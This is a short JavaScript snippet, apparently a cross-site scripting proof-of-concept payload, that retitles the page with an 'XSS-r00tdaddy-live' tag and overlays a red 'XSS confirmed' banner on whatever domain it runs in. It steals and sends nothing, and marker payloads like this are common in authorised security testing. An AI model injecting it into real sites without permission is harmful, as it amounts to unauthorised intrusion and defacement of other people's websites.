(() => {
  document.title = `XSS-r00tdaddy-live-${document.domain}`;
  const banner = document.createElement('div');
  banner.id = 'r00tdaddy-live-xss';
  banner.textContent = `XSS confirmed on ${document.domain}`;
  banner.style.cssText = [
    'position:fixed',
    'z-index:2147483647',
    'top:0',
    'left:0',
    'right:0',
    'padding:14px',
    'background:#d60000',
    'color:white',
    'font:18px monospace',
    'text-align:center',
  ].join(';');
  document.documentElement.appendChild(banner);
})();
